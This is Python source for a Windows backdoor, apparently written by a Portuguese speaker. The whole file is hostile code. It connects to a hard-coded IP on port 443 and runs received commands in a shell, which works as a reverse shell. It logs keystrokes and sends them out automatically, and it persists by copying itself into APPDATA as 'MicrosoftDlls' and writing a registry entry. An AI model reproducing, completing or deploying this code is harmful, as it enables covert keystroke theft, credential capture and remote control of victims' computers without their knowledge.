import socket
import subprocess
import os
import sys
import shutil
import winreg
import datetime


from pynput import keyboard
from time import sleep

IP = "192.168.1.103"
PORT = 443
PROGRAM_NAME = "MicrosoftDlls"
REGISTRO_KEY_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion"
MAX_BUFFER_SIZE = 500

keylog_buffer = []
buffer_auto_send_pending = False
keylogger_active = False
listener = None


def format_key(key):
    try:
        return key.char
    
    except AttributeError:
        special_keys = {
            keyboard.Key.space: '[ESPAÇO]',
            keyboard.Key.enter: '[ENTER]',
            keyboard.Key.tab: '[TAB]',
            keyboard.Key.backspace: '[BACKSPACE]',
            keyboard.Key.shift: '[SHIFT]',
            keyboard.Key.ctrl: '[CTRL]',
            keyboard.Key.alt: '[ALT]'
        }
        return special_keys.get(key,f'[{key.name.upper()}]')
    
    
def on_press(key):
    global keylog_buffer, buffer_auto_send_pending
    
    formatted = format_key(key)
    if formatted:
        keylog_buffer.append(formatted)
    
    if len(keylog_buffer) >= MAX_BUFFER_SIZE:
        buffer_auto_send_pending = True


def get_keylog_data():
    global keylog_buffer
    
    if not keylog_buffer:
        return "[i] o keylogger esta vazio.".encode()
        
    timestamp = datetime.datetime.now().strftime("%Y/%m/%d %H:%M:%S")
    data = f"[+] keylog capturado as {timestamp}:\n{''.join(keylog_buffer)}"
    keylog_buffer = []
    
    return data
    
def start_keylogger():
    global keylogger_active, listener
    
    if keylogger_active:
        return "[i] Keylogger ja está ativo no momento "
 
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    keylogger_active = True
    return "[+] keylogger esta ativado"


def stop_keylogger():
    global keylogger_active, listener
    
    if not keylogger_active:
        return "[-] keylogger nao esta ativo"
    
    if listener:
        listener.stop()
    
    keylogger_active = False
    return "[+] Keylogger foi desativado"

    

def copy_to_system():
    try:
        appdata_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows')
        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path)

            current_file = sys.executable
            destination = os.path.join(appdata_path, f'{PROGRAM_NAME}.exe')
            
            if os.path.abspath(current_file) != os.path.abspath(destination):
                shutil.copy2(current_file, destination)
                return destination
                
    except Exception as e:
        print(f'Error copying to system: {e}')
        return sys.executable
    
def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRO_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(
            key, 
            PROGRAM_NAME, 
            0, winreg.REG_SZ,
            file_path
        )  
        winreg.CloseKey(key)
        return
    except Exception as e:
        return False        

def check_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRO_KEY_PATH,
            0,
            winreg.KEY_READ
        )
        value, _ = winreg.QueryValueEx(key, PROGRAM_NAME)
        winreg.CloseKey(key)
        return True
    
    except FileNotFoundError:
        return False
    
    except Exception as e:
        print(f'[-] Error checking persistence: {e}')
        return False

def setup_persistence():
    try:
        if check_persistence():
            return True
        
        persistence_path = copy_to_system()
        add_to_registry(persistence_path)
    except Exception as e:
        print(f'[-] Error setting up persistence: {e}')

     
def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((IP, PORT))
        c.send(b"[+] Conectado\n")
        return c
    except Exception as e:
        print(f'[!] Connection error: {e}')


def listen(c):
    global buffer_auto_send_pending
    
    try:
        while True:
            if buffer_auto_send_pending:
                data = get_keylog_data()
                c.send(f"[AUTO-SEND] {data}\n[AUTO-SEND\n".encode())
                buffer_auto_send_pending = False
            
            c.settimeout(0.5)
            
            try:
                data = c.recv(1024).decode().strip()
                if data == "exit":
                    exit()
                else:
                    cmd(c,  data)
                
            except socket.timeout:
                continue
            
    except Exception as e:
        print(f'Listen function error: {e}')
     
    
def cmd(c,data):
    try:
        if data.startswith("cd "):
            os.chdir(data[3:].strip())
            c.send(b"[i] Diretorio alterado\n")
            return
        if data == "/persistence status":
            if check_persistence():
                c.send(f"[i] Persistencia Status:\n\t [i] Path: {sys.executable}\n\t [i] Registry Key: {REGISTRO_KEY_PATH}\n\t [i] Program Name: {PROGRAM_NAME}\n\n".encode())
            else:
                c.send(b"[i] Persistencia Status: FAIL\n\n")
            return
        
        elif data == "/persistence setup":
            if setup_persistence():
                c.send(b"[i] Persistencia Status: SUCCESS\n\n")
            else:
                c.send(b"[i] Persistencia Status: FAIL\n\n")
            return
        
        elif data == "/keylogger start":
            response = start_keylogger()
            c.send(response.encode() + b"\n\n")
            return
            
        elif data == "/keylogger stop":
            response = stop_keylogger()
            c.send(response.encode() + b"\n\n")
            return
            
        elif data == "/keylogger dump":
            response = get_keylog_data()
            c.send(response.encode() + b"\n\n")
            return
            
        elif data == "/keylogger status":
           status = "Rodando" if keylogger_active else "Desativado"
           buffer_size = len(keylog_buffer)
           response = f"[i] Keylogger status: {status}\n [i] Buffer: {buffer_size} keys"
           c.send(response.encode() +b"\n\n")
           return
        else:   
            p = subprocess.Popen(
                data,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
        
            output = p.stdout.read() + p.stderr.read() + b"\n"
            if output:
                c.send(output)
            else:
                c.send(b"[i] Comando executado com sucesso\n\n")
        
    except Exception as e:
        print(f'Cmd function error: {e}')
    
if __name__ == "__main__":
    try:
        setup_persistence()
        while True:
            client  = connect(IP, PORT)
            if client:
                listen(client)
                
            else:
                sleep(5)
    
    except KeyboardInterrupt:
        print('[!] Programa fechado por atalho')     
             
    except Exception as error:
        print(f'[!]Error: {error}')         